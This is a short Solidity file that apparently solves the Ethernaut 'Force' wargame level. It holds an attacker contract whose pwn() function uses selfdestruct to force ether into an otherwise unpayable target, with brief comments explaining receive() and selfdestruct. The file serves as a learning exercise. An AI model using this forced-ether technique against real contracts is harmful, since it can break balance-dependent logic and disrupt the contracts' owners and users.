// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {
    /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */
}

contract ForceAttack {
    Force public force;
    constructor(address _force) payable {
        force = Force(_force);
    }

    function pwn() public payable {
        require(address(this).balance > 0, "No balance to send");
        selfdestruct(payable(address(force)));
    }

    receive() external payable {}
}

/**
the receive() function is special, and is called when ether is sent to contract without any call data.

selfdestruct force pushes the ether to any destination.
*/
